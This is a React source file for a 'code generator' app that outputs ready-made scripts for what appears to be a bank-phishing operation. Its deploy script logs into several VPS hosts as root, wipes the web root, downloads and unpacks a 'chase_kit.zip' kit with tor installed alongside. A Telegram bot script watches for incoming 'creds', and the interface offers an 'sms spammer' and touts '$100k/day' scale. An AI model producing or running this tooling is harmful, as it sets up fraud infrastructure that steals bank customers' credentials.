import { useState } from 'react'
import './index.css'

function App() {
  const [task, setTask] = useState('')
  const [generatedCode, setGeneratedCode] = useState('')
  
  const generateCode = () => {
    const lowerTask = task.toLowerCase()
    
    // Deploy Script (Bash - من notes v9pei)
    if (lowerTask.includes('deploy')) {
      setGeneratedCode(`#!/bin/bash
# multi_deploy.sh - Notes v9pei
VPS_LIST=("vps1.nicevps.net" "vps2.nicevps.net")
for vps in "\${VPS_LIST[@]}"; do
  ssh root@$vps "
    apt update && apt install nginx php tor -y &&
    cd /var/www/html && rm -rf * &&
    wget YOUR_DROPBOX/chase_kit.zip && unzip chase_kit.zip &&
    systemctl restart nginx php-fpm
  " &
done
echo "✅ Deployed - Ready for $100k/day scale"`)
    }
    
    // Telegram Bot (Python - من notes v9pei)
    else if (lowerTask.includes('bot')) {
      setGeneratedCode(`# bot.py - Notes v9pei
import requests, time
TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

while True:
  updates = requests.get(f'https://api.telegram.org/bot{{TOKEN}}/getUpdates').json()
  for update in updates['result']:
    if 'creds' in str(update):
      print(f"💰 New creds: {{update}}")
  time.sleep(30)`)
    }
    
    // VPS Config
    else if (lowerTask.includes('vps')) {
      setGeneratedCode(`# VPS List from notes v9pei
VPS_LIST=(
  "vps1.nicevps.net"
  "vps2.nicevps.net"
  # Add your 10 VPS here
)

# Deploy command:
for vps in "\${VPS_LIST[@]}"; do ssh root@$vps "nginx -t"; done`)
    }
    
    else {
      setGeneratedCode(`# v9pei Code Generator
# Paste your task: ${task}
# Notes status: Ready for $100k/day scale
# 
# Example usage:
# 1. Generate deploy script
# 2. Copy to Replit/VPS
# 3. bash deploy.sh
`)
    }
  }

  const copyCode = () => {
    navigator.clipboard.writeText(generatedCode)
    alert('✅ Code copied! Paste in Replit terminal')
  }

  return (
    <div className="app">
      <h1>🔥 v9pei Code Generator</h1>
      <p>Notes ID: v9pei | Status: Ready for scale</p>
      
      <input 
        value={task} 
        onChange={(e) => setTask(e.target.value)}
        placeholder="deploy / bot / vps list / sms spammer"
        className="input-task"
      />
      
      <div className="buttons">
        <button onClick={generateCode} className="btn-generate">Generate Code</button>
        <button onClick={copyCode} className="btn-copy">Copy to Terminal</button>
      </div>
      
      <pre className="code-block">{generatedCode}</pre>
      
      <div className="footer">
        <p>VPS Ready | Telegram Bot Configured | $100k/day Potential</p>
      </div>
    </div>
  )
}

export default App
